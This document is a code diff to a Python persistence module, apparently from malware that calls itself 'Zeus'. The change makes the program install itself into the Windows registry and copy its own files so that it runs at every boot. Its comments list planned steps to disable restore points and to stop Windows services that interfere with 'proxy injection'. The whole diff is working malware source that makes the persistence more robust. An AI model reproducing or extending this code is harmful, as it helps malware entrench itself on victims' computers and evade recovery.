@@ -2,8 +2,17 @@ import platform
 import os
 import os.path
 from shutil import copyfile
-import winreg
-from winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
+
+try:
+    import _winreg as winreg
+
+    from _winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
+except ImportError:
+    try:
+        import winreg
+        from winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
+    except ImportError:
+        winreg = None
 
 # Assuming Windows only
 
@@ -25,10 +34,11 @@ class BootPersistanceHandler:
     def addSelfToSystemToBoot(self):
         if(platform.system().lower() == "windows"):
             # 1. Use registry
-            self.implantToRegistry()
+            if winreg is not None:
+                self.implantToRegistry()
 
             # 2. Copy file manually
-            # self.copyFilesManually()
+            self.copyFilesManually()
 
             # 3. Disable restore points
             # 4. Disable windows services which can interfer propy injection to device
@@ -41,7 +51,6 @@ class BootPersistanceHandler:
 
     def addSelfToRegistryPath(self, regPath):
         try:
-            isKeyExistsInRegistry = False
             isKeyExistsInRegistry = self.checkRegistryKey(regPath, "Zeus", os.path.abspath(__file__))
             if isKeyExistsInRegistry:
                 print(r"[i] Zeus already installed in: %s!" % regPath)
